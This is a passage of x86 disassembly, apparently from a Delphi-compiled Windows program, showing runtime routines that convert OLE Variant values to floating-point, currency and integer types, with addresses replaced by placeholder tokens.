add esp 0x18
pop ebx
retn
sub_4116a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4116f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f878
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411754
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411700
lea eax [ ebp - 0x18 ]
call sub_40f550
retn
sub_411708
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411754
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411770 ]
mov eax ebx
call sub_411594
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411594
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411754
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411658
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4116a4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40ed6c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411708
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411658
fstp [ esp ]
fwait
mov eax ebx
call sub_411658
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41194d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411594
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411754
fstp [ esp ]
fwait
jmp r-xdata
sub_411aec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411c51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_411754
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_411b0e ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40ed6c
sub_411c7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411d58
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_413208
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b320
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d5f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0xc ]
call sub_4046b0
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409aa0
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40f1ac
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40f1ac
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411d68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f1ac
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411dc8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40f1ac
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411e14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411e69
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f878
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411ec4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e70
lea eax [ ebp - 0x18 ]
call sub_40f550
retn
sub_411e78
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411ec4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411ee0 ]
mov eax ebx
call sub_411c7c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411dc8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411c7c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d68
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ec4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411dc8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411e14
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40ed6c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411e78
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411dc8
fstp [ esp ]
fwait
mov eax ebx
call sub_411dc8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4120ab ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411dc8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411c7c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d68
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411ec4
fstp [ esp ]
fwait
jmp r-xdata
sub_412214
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4122c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_413208
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409af8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4122c7
lea eax [ ebp - 0x10 ]
call sub_403fa4
lea eax [ ebp - 0xc ]
call sub_4046b0
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40f1ac
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40f1ac
jmp r-xdata
sub_4122d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f1ac
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_412330
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40f1ac
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_41237c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4123d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f878
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41242c
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4123d8
lea eax [ ebp - 0x18 ]
call sub_40f550
retn
sub_4123e0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415bdc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41242c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412448 ]
mov eax ebx
call sub_412214
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412214
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4122d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41242c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41237c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40ed6c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4123e0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41264d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_412330
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_412214
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4122d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41242c
fistp [ esp ]
fwait
jmp r-xdata
sub_4127f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046b0
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40f1ac
pop ebx
pop ebp
retn 0x8
sub_412830
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046b0
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40f1ac
pop ebx
pop ebp
retn 0x8
sub_412868
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41291e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4046b0
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40f1ac
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412925
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc8
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_40422c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4080f4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047fc
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_40422c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4080b8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047fc
jmp r-xdata
jmp r-xdata
call sub_40ee08
sub_41292c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4129eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4129c9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40f1ac
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047c0
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048ac
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40422c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129d0
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_4129f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412a4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f878
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a55
lea eax [ ebp - 0x10 ]
call sub_40f550
retn
sub_412a5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415bdc
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ad1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ff8
xor eax eax
pop edx
